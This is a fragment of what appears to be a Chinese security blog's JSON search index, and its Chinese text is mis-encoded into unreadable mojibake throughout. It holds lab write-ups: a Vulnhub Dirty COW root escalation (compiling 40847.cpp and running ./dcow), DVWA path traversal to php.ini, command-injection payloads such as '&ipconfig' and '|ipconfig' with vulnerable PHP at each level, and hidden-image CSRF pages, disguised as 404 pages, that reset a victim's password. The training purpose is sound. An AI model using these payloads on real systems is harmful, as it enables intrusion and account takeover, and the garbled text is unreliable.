Virgulinoï¼Œæ•…å¯å°è¯•è„ç‰›ææƒã€‚scp /root/tools/scan-dirtycow-master/dirtycowscan.sh tiago@192.168.117.141:/home/tiagoå°†è„ç‰›æ¼æ´æ‰«æå™¨ä¼ åˆ°é¶æœºä¸Šã€‚åœ¨é¶æœºè¿è¡Œæ‰«æè„šæœ¬ï¼Œæ˜¾ç¤ºå­˜åœ¨æ¼æ´ã€‚åœ¨æ”»å‡»æœºä¸Šsearchsploit dirtyï¼ŒåŒæ ·ç”¨scpä¸Šä¼ åˆ°é¶æœºï¼šåœ¨é¶æœºæŸ¥çœ‹åˆšæ‰ä¸Šä¼ çš„expæ–‡ä»¶vim 40847.cppï¼Œæ–‡ä»¶å†…ä¼šç»™å‡ºç¼–è¯‘å‘½ä»¤g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilï¼Œæ‰§è¡Œç¼–è¯‘å‘½ä»¤ï¼Œå½¢æˆç¼–è¯‘æ–‡ä»¶dcowï¼Œ./dcow -sè¿è¡Œdcowï¼ŒææƒæˆåŠŸã€‚æ‹¿åˆ°rootæƒé™åï¼Œè¿›å…¥ /rootï¼Œæ‰¾åˆ°flag.txtï¼Œè·å¾—flagã€‚\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","è„ç‰›ææƒ","Metasoploit","searchsploit"]},{"title":"DVWA|FileInclusion","url":"/4d5d77bb.html","content":"0.æ¼æ´åŸç†\nFile Inclusionï¼šæ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´ï¼‰ï¼Œæ˜¯æŒ‡å½“æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆinclude()ï¼Œrequire()å’Œinclude_once()ï¼Œrequire_once()ï¼‰åˆ©ç”¨urlå»åŠ¨æ€åŒ…å«æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æœåŠ¡å™¨é€šè¿‡phpçš„ç‰¹æ€§ï¼ˆå‡½æ•°ï¼‰å»åŒ…å«ä»»æ„æ–‡ä»¶æ—¶ï¼Œç”±äºè¦åŒ…å«çš„è¿™ä¸ªæ–‡ä»¶æ¥æºè¿‡æ»¤ä¸ä¸¥ï¼Œä»è€Œå¯ä»¥å»åŒ…å«ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ„é€ è¿™ä¸ªæ¶æ„æ–‡ä»¶æ¥è¾¾åˆ°è‡ªå·±çš„ç›®çš„ã€‚  \n\næœåŠ¡å™¨åŒ…å«æ–‡ä»¶æ—¶ï¼Œä¸ç®¡æ–‡ä»¶åç¼€æ˜¯å¦æ˜¯phpï¼Œéƒ½ä¼šå°è¯•å½“åšphpæ–‡ä»¶æ‰§è¡Œï¼Œå¦‚æœæ–‡ä»¶å†…å®¹ç¡®ä¸ºphpï¼Œåˆ™ä¼šæ­£å¸¸æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¼šåŸå°ä¸åŠ¨åœ°æ‰“å°æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥æ–‡ä»¶åŒ…å«æ¼æ´å¸¸å¸¸ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ä¸ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚  \nè¯¥æ¼æ´æ¶‰åŠåˆ°phpå¸¸è§åŒ…å«æ–‡ä»¶å‡½æ•°åŒ…æ‹¬ï¼š\n\ninclude()ï¼šå½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ°include()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚  \ninclude_once()ï¼šåŠŸèƒ½å’Œinclude()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚  \nrequire()ï¼šrequire()ä¸include()çš„åŒºåˆ«åœ¨äºrequire()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œã€‚ä½¿ç”¨require()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªè¦ç¨‹åºä¸€æ‰§è¡Œï¼Œç«‹å³è°ƒç”¨æ–‡ä»¶ï¼Œè€Œinclude()åªæœ‰ç¨‹åºæ‰§è¡Œåˆ°å‡½æ•°æ—¶æ‰è°ƒç”¨.require()åœ¨phpç¨‹åºæ‰§è¡Œå‰æ‰§è¡Œï¼Œä¼šå…ˆè¯»å…¥requireæ‰€æŒ‡å®šå¼•å…¥çš„æ–‡ä»¶ï¼Œä½¿å®ƒå˜æˆPHPç¨‹åºç½‘é¡µçš„ä¸€éƒ¨åˆ†ã€‚  \nrequire_once()ï¼šå®ƒçš„åŠŸèƒ½ä¸require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚  \n\n\n\n\n\n1.Low_level1.1 å°è¯•æ”»å‡»\nå½“ç‚¹å‡»file1æ—¶ï¼Œè·³è½¬çš„urlä¸ºhttp://localhost/DVWA-master/vulnerabilities/fi/?page=file1.phpï¼Œå°†å‚æ•°file1.phpæ”¹ä¸º```../../php.ini```ï¼š![avatar][img1]æˆåŠŸæŸ¥çœ‹æœåŠ¡å™¨php.iniæ–‡ä»¶ã€‚\n\nå¯ä»¥çœ‹åˆ°magic_quote_gpc=offï¼ŒPHP4.0åŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œè¯¥é€‰é¡¹é»˜è®¤å¼€å¯ï¼›PHP5.4ä¹‹åçš„ç‰ˆæœ¬å·²åˆ é™¤è¯¥é€‰é¡¹ã€‚åœ¨å°äºPHP5.3.4çš„æœåŠ¡å™¨ä¸­ï¼Œmagic_quote_gpc=offæ—¶ï¼Œå¯ä»¥åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨%00æˆªæ–­ï¼ˆ%00åçš„å†…å®¹ä¸ä¼šè¢«è¯†åˆ«ï¼Œå¯å€Ÿæ­¤ç»•è¿‡æŸäº›è¿‡æ»¤è§„åˆ™ï¼‰ã€‚  \n\nåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªphpshell.txtæ–‡ä»¶ï¼š![avatar][img2]\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["DVWA","FileInclusion"]},{"title":"DVWA|CommandInjection","url":"/b9aee5c3.html","content":"0.æ¼æ´åŸç†\nåœ¨æ“ä½œä¸­ç³»ç»Ÿä¸­ &amp;ã€&amp;&amp;ã€|ã€|| éƒ½å¯ä»¥ä½œä¸ºå‘½ä»¤è¿æ¥ç¬¦ä½¿ç”¨ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ã€‚&amp;&amp;å’Œ&amp;çš„åŒºåˆ«åœ¨äºï¼Œ&amp;&amp;æ˜¯æ‰§è¡Œå®Œå‰é¢çš„å‘½ä»¤ç„¶åæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œ&amp;æ˜¯ä¸ç®¡å‰é¢çš„å‘½ä»¤æ˜¯å¦å€¼æ‰§è¡Œï¼Œåé¢çš„éƒ½æ‰§è¡Œã€‚  \n\n1.Low_level1.1 å°è¯•æ³¨å…¥\nåœ¨ipåœ°å€åè¾“å…¥&amp;ipconfigï¼š  \n\n1.2 æºä»£ç \n&lt;?php \nif(isset($_POST['Submit'])) &#123;\n   // Step1 ä»£ç æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ip  \n   $target = $_REQUEST['ip'];   \n   // Step2 æ ¹æ®æ“ä½œç³»ç»Ÿçš„åŒºåˆ«ï¼Œå¯¹æ¥æ”¶ipæ‰§è¡Œå‘½ä»¤ä¸åŒçš„pingæ“ä½œ\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final åé¦ˆç»“æœæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–é™åˆ¶\n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n2.Medium_level2.1 å°è¯•æ³¨å…¥\nåœ¨ipåœ°å€åè¾“å…¥&amp;ipconfigï¼š  \n\n2.2 æºä»£ç \n&lt;?php\nif (isset($_POST['Submit']))&#123;\n   // Step1 ä»£ç æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ip  \n   $target = $_REQUEST['ip'];\n   // Step2 è®¾ç½®è¿‡æ»¤åˆ—è¡¨  \n   $subtitutions = array(\n       '&amp;&amp;' => '', //è¿‡æ»¤äº†'&amp;&amp;'  \n       ';' => '', //è¿‡æ»¤äº†';'  \n   );\n   // Step3 å°†æ¥æ”¶åˆ°çš„è¾“å…¥ä¸­ä¸è¿‡æ»¤åˆ—è¡¨åŒ¹é…çš„å­—ç¬¦è¿‡æ»¤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 æ ¹æ®æ“ä½œç³»ç»Ÿçš„åŒºåˆ«ï¼Œå¯¹æ¥æ”¶ipæ‰§è¡Œå‘½ä»¤ä¸åŒçš„pingæ“ä½œ\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final è¿‡æ»¤åˆ—è¡¨ä¹‹è¿‡æ»¤äº†\"&amp;&amp;\"å’Œ\";\"ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å‘½ä»¤å­—ç¬¦æ³¨å…¥  \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n3.High_level3.1 å°è¯•æ³¨å…¥\nåœ¨ipåœ°å€åè¾“å…¥|ipconfigï¼š  \n\n3.2 æºä»£ç \n&lt;?php \nif (isset($_POST['Submit']))&#123;\n   // Step1 ä»£ç æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ip  \n   $target = $_REQUEST['ip'];\n   // Step2 è®¾ç½®è¿‡æ»¤åˆ—è¡¨  \n   $subtitutions = array(\n       '&amp;' => '',\n       '&amp;&amp;' => '',   \n       ';' => '', \n       '| ' => '', //ä»”ç»†çœ‹è¿™é‡Œè¿‡æ»¤çš„æ˜¯'| ',æ„å‘³ç€'|'ä»å¯åˆ©ç”¨\n       '-' => '',\n       '$' => '',\n       '(' => '',\n       ')' => '',\n       '`' => '',\n       '||' => '',\n   );\n   // Step3 å°†æ¥æ”¶åˆ°çš„è¾“å…¥ä¸­ä¸è¿‡æ»¤åˆ—è¡¨åŒ¹é…çš„å­—ç¬¦è¿‡æ»¤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 æ ¹æ®æ“ä½œç³»ç»Ÿçš„åŒºåˆ«ï¼Œå¯¹æ¥æ”¶ipæ‰§è¡Œå‘½ä»¤ä¸åŒçš„pingæ“ä½œ\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final Highç­‰çº§çš„è¿‡æ»¤åˆ—è¡¨æ¯”Mediumå¢åŠ äº†å­—ç¬¦    \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n?>\n\n4.Impossible_level4.1 æºä»£ç \n&lt;?php\nif(isset($_POST['Submit']))&#123;\n   checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');//åŠ å…¥äº†Anti-CSRF Token\n   $target = $_REQUEST['ip'];\n   $target = stripslashes($target); //è¯¥å‡½æ•°ä¼šåˆ é™¤å­—ç¬¦ä¸²stringä¸­çš„åæ–œæ ï¼Œè¿”å›å·²å‰¥ç¦»åæ–œæ çš„å­—ç¬¦ä¸²ã€‚  \n   $octet = explode(\".\",$target); //è¯¥å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œè¿”å›å­—ç¬¦ä¸²çš„æ•°ç»„ã€‚å‚æ•°separatorè§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ï¼Œå‚æ•°stringæ˜¯è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ï¼Œå¯é€‰å‚æ•°limitè§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚  \n   if((is_numeric($octet[0]))&amp;&amp;(is_numeric($octet[1]))&amp;&amp;(is_numeric($octet[2]))&amp;&amp;(is_numeric($octet[3]))&amp;&amp;(sizeof($octet)==4))&#123; //æ£€æµ‹stringæ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚  \n       $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];//åªæœ‰[int.int.int.int]æ ¼å¼çš„è¾“å…¥æ‰æ‰§è¡Œ\n       if(stristr(php_uname('s'),'Windows NT'))&#123;\n           $cmd = shell_exec('ping'.$target);\n       &#125;\n       else&#123;\n           $cmd = shell_exec('ping -c 4'.$target);\n       &#125;\n       $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n   &#125;\n   else&#123;\n       $html .= '&lt;pre>ERROR:You have entered an incalid IP.&lt;/pre>';\n   &#125;\n   \n&#125;\ngenerateSessionToken();\n?>\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["DVWA","CommandInjection"]},{"title":"DVWA|CSRF","url":"/18030393.html","content":"0.æ¼æ´åŸç†\n\nä¸€ä¸ªè®²çš„å¾ˆå¥½çš„åšå®¢æ¨èé˜…è¯»:æµ…è°ˆCSRFæ”»å‡»æ–¹å¼\n\n\n1.Low_level1.1 å°è¯•æ”»å‡»\nè·å–ä¿®æ”¹å¯†ç æ—¶ä½¿ç”¨çš„urlï¼Œå°†urlæ”¹é€ ä¸ºè‡ªå·±éœ€è¦å¯†ç ï¼Œç›´æ¥ç‚¹å‡»urlï¼Œæ²¡æœ‰éªŒè¯èº«ä»½ä¹Ÿå¯æˆåŠŸä¿®æ”¹å¯†ç ã€‚æ„é€ æ”»å‡»csrf_low.htmlé¡µé¢ï¼š&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>  è®¿é—®csrf_low.htmlåï¼Œé€€å‡ºDVWAé‡æ–°ç™»å½•ï¼Œå¯ä»¥ä½¿ç”¨å¯†ç 123456ç™»å½•ã€‚   \n\n1.2 æºä»£ç \n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Get input \n$pass_new  = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;// æ ¡éªŒpass_newæ˜¯å¦ç­‰äºpass_conf\n\t// They do! \n\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t$pass_new = md5( $pass_new );\n\t// Update the database æ›´æ–°å¯†ç \n\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t// Feedback for the user\n\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n\t// Issue with passwords matching\n\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.Medium_level2.1 å°è¯•æ”»å‡»\nç”¨Low_levelçš„æ”»å‡»æ–¹å¼è¿›è¡Œå°è¯•ï¼Œè®¿é—®æ”»å‡»é¡µé¢csrf_low.htmlåæ— æ³•æˆåŠŸä¿®æ”¹å¯†ç ï¼šå…ˆçœ‹ä¸€ä¸‹æºä»£ç ã€‚\n\n2.2 æºä»£ç \n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// åŠ ä¸Šäº†å¯¹ç”¨æˆ·è¯·æ±‚å¤´çš„ä¸­çš„Refererå­—æ®µè¿›è¡ŒéªŒè¯,å³ç”¨æˆ·çš„è¯·æ±‚å¤´ä¸­çš„Refererå­—æ®µå¿…é¡»åŒ…å«äº†æœåŠ¡å™¨çš„åå­—ã€‚\nif( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) &#123;\n\t// Get input\n\t$pass_new  = $_GET[ 'password_new' ];\n\t$pass_conf = $_GET[ 'password_conf' ];\n\t// Do the passwords match?\n\tif( $pass_new == $pass_conf ) &#123;\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t\t$pass_new = md5( $pass_new );\n\t\t// Update the database\n\t\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t\t// Feedback for the user\n\t\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n\t&#125;\n\telse &#123;\n\t\t// Issue with passwords matching\n\t\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n\t&#125;\n&#125;\nelse &#123;\n\t// Didn't come from a trusted source\n\t$html .= \"&lt;pre>That request didn't look correct.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.3 å†æ¬¡å°è¯•æ”»å‡»\né€šè¿‡æºä»£ç å¯çŸ¥ï¼Œç¨‹åºæ ¡éªŒäº†è¯·æ±‚æŠ¥æ–‡ä¸­çš„Refererï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼Œé˜²æ­¢äº†ä»ä¸çŸ¥åé¡µé¢çš„è·³è½¬ã€‚fiddleræŠ“åŒ…ï¼Œå¯¹æ¯”å‘ç°æˆåŠŸä¿®æ”¹å¯†ç ä¸å¤±è´¥çš„è¯·æ±‚æŠ¥æ–‡çš„åŒºåˆ«ï¼ŒäºŒè€…Refererä¸åŒï¼šå¯ä»¥é€šè¿‡ç¼–è¾‘ .html æ–‡ä»¶åï¼Œæ¥ä½¿ Referer å‚æ•°åŒ…å«æœåŠ¡å™¨ipåœ°å€ï¼šã€192.168.117.129_csrf_medium.htmlã€‘è®¿é—®http://172.16.0.166/192.168.117.129_csrf_medium.htmlï¼ŒfiddleræŠ“åŒ…æ˜¾ç¤ºä¿®æ”¹å¯†ç æˆåŠŸã€‚  \n\n3.High_level3.1 æºä»£ç \n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// åCSRFçš„éªŒè¯tokenæœºåˆ¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°tokenåï¼Œä¼šé¦–å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šç»§ç»­å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;\n// They do!\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update the database\n$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n$result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n// æ¯æ¬¡ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›éšæœºçš„tokenã€‚ï¼ˆä¸‹ä¸€æ¬¡è¯·æ±‚éœ€è¦çš„tokenéšè—åœ¨è¿™ä¸€æ¬¡å“åº”çš„æŠ¥æ–‡ä¸­ï¼‰\ngenerateSessionToken();\n?>\n\n3.2 å°è¯•æ”»å‡»\næ­£å¸¸ä¿®æ”¹å¯†ç æŠ“åŒ…å‘ç°ï¼Œè¯·æ±‚å¤´ä¸­å¤šäº†ä¸€ä¸ªuser_tokenå‚æ•°ï¼Œåœ¨å“åº”æŠ¥æ–‡ä¸­æ‰¾åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚éœ€è¦çš„user_tokenï¼šæ„é€ æ”»å‡»csrf_high.htmlé¡µé¢ï¼š&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=199422ab6cb786bf4f14219bbc82bea5#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>è®¿é—®csrf_high.htmlåï¼Œä¿®æ”¹å¯†ç æˆåŠŸã€‚  \n\n4.Impossible_level4.1 æºä»£ç \n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Check Anti-CSRF token\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_curr = $_GET[ 'password_current' ];\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Sanitise current password input\n$pass_curr = stripslashes( $pass_curr );\n$pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_curr = md5( $pass_curr );\n// Check that the current password is correct\n$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );\n$data->execute();\n// Do both new passwords match and does the current password match the user?\nif( ( $pass_new == $pass_conf ) &amp;&amp; ( $data->rowCount() == 1 ) ) &#123;\n// It does!\n$pass_new = stripslashes( $pass_new );\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update database with new password\n$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );\n$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->execute();\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match or current password incorrect.&lt;/pre>\";\n&#125;\n&#125;\n// Generate Anti-CSRF token\ngenerateSessionToken();\n?>\n\nPDOæŠ€æœ¯é˜²å¾¡SQLæ³¨å…¥ï¼ŒPHP æ•°æ®å¯¹è±¡ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚å®ç° PDO æ¥å£çš„æ¯ä¸ªæ•°æ®åº“é©±åŠ¨å¯ä»¥å…¬å¼€å…·ä½“æ•°æ®åº“çš„ç‰¹æ€§ä½œä¸ºæ ‡å‡†æ‰©å±•åŠŸèƒ½ã€‚ä¹Ÿå°±æ˜¯é‡‡ç”¨äº†é¢„å¤„ç†çš„æ–¹å¼å°†è¿è¡Œè¯­å¥ä¸å‚æ•°éš”ç¦»ã€‚  \né˜²æŠ¤CSRFï¼Œåˆ™è¦æ±‚ç”¨æˆ·è¾“å…¥åŸå§‹å¯†ç ï¼ˆç®€å•ç²—æš´ï¼‰ï¼Œå‰ææ˜¯åè®®ä¼ è¾“æ²¡æœ‰é—®é¢˜ï¼Œæ”»å‡»è€…åœ¨ä¸çŸ¥é“åŸå§‹å¯†ç çš„æƒ…å†µä¸‹ï¼Œæ— è®ºå¦‚ä½•éƒ½æ— æ³•è¿›è¡ŒCSRFæ”»å‡»ã€‚\n\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["DVWA","CSRF"]},{"title":"â€œå·®å¼‚â€é¢˜","url":"/e0b816a7.html","content":"ä¸‰çº§ä¸äºŒçº§çš„å·®å¼‚\nQ:ã€ŠåŸºæœ¬è¦æ±‚ã€‹ä¸­ï¼Œåœ¨åº”ç”¨å®‰å…¨å±‚é¢çš„è®¿é—®æ§åˆ¶è¦æ±‚ä¸­ï¼Œä¸‰çº§ç³»ç»Ÿè¾ƒäºŒçº§ç³»ç»Ÿå¢åŠ çš„æªæ–½æœ‰å“ªäº›ï¼ŸA:1ï¼‰åº”ç”±æˆæƒä¸»ä½“é…ç½®è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œè®¿é—®æ§åˆ¶ç­–ç•¥è§„å®šä¸»ä½“å¯¹å®¢ä½“çš„è®¿é—®è§„åˆ™ã€‚2ï¼‰è®¿é—®æ§åˆ¶çš„ç²’åº¦åº”è¾¾åˆ°ä¸»ä½“ä¸ºç”¨æˆ·çº§æˆ–è¿›ç¨‹çº§ï¼Œå®¢ä½“ä¸ºæ–‡ä»¶ã€æ•°æ®åº“è¡¨çº§ã€‚3ï¼‰åº”å¯¹é‡è¦çš„ä¸»ä½“å’Œå®¢ä½“è®¾ç½®å®‰å…¨æ ‡è®°ï¼Œå¹¶æ§åˆ¶ä¸»ä½“å¯¹æœ‰å®‰å…¨æ 